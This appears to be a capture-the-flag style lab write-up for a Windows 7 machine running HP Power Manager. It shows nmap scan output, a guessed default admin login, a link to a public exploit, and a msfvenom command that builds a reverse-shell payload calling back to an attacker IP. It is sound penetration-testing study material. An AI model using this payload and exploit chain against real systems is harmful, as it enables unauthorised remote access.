# nmap
```
┌──(kali㉿kali)-[~/PG/kevin]
└─$ nmap -p- --min-rate 10000 192.168.152.45                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 04:38 EST
Warning: 192.168.152.45 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.152.45
Host is up (0.044s latency).
Not shown: 65437 closed tcp ports (reset), 86 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
                                                                                                                                           
┌──(kali㉿kali)-[~/PG/kevin]
└─$ nmap -p 80,135,139,445,3389,3573 -sCV 192.168.152.45                    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 04:39 EST
Nmap scan report for 192.168.152.45
Host is up (0.041s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.152.45/index.asp
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2025-02-22T09:36:33
|_Not valid after:  2025-08-24T09:36:33
|_ssl-date: 2025-02-23T09:39:56+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2025-02-23T09:39:41+00:00
3573/tcp open  tag-ups-1?
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:f6:c7 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-23T01:39:41-08:00
| smb2-time: 
|   date: 2025-02-23T09:39:41
|_  start_date: 2025-02-23T09:37:21

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.92 seconds
```
![Pasted image 20250223174031](<0. Attachments/Pasted image 20250223174031.png>)

# web enum
![Pasted image 20250223174246](<0. Attachments/Pasted image 20250223174246.png>)

guessed admin --> admin

![Pasted image 20250223174325](<0. Attachments/Pasted image 20250223174325.png>)

![Pasted image 20250223174627](<0. Attachments/Pasted image 20250223174627.png>)

# exploit
https://www.exploit-db.com/exploits/10099

using
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.203 LPORT=80 -f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
```
![Pasted image 20250223180347](<0. Attachments/Pasted image 20250223180347.png>)

![Pasted image 20250223182050](<0. Attachments/Pasted image 20250223182050.png>)

replace the code with that keep n00bnoob

# initial access
![Pasted image 20250223182123](<0. Attachments/Pasted image 20250223182123.png>)

![Pasted image 20250223182138](<0. Attachments/Pasted image 20250223182138.png>)

